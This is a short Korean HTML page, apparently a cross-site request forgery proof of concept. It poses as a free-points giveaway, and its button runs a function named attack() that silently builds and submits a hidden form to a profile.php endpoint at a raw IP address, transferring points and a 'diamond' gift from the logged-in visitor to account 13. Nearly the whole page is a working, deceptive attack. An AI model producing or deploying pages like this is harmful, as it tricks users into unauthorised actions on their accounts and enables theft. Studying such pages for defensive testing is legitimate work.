<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎁 포인트 받기</title>
    <style>
        body { 
            font-family: Arial; 
            text-align: center; 
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        button {
            padding: 20px 40px;
            font-size: 18px;
            background: #FF6B6B;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>🎁 무료 포인트 이벤트!</h1>
    <p>아래 버튼을 클릭하면 100 포인트를 받을 수 있습니다!</p>
    
    <button onclick="attack()">🎉 포인트 받기!</button>
    
    <div id="result"></div>
    
    <script>
        function attack() {
            // Form 생성 및 전송
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php';
            form.target = '_blank';
            
            const data = {
                receiver_id: '13',
                points: '100', 
                send_gift: '1',
                gift_type: 'diamond',
                message: 'MANUAL_CSRF'
            };
            
            for (let key in data) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = data[key];
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
            
            document.getElementById('result').innerHTML = 
                '<p style="color: lime;">✅ 포인트 전송 완료!</p>' +
                '<p><a href="http://3.36.66.216" target="_blank">결과 확인하기 →</a></p>';
        }
    </script>
</body>
</html>
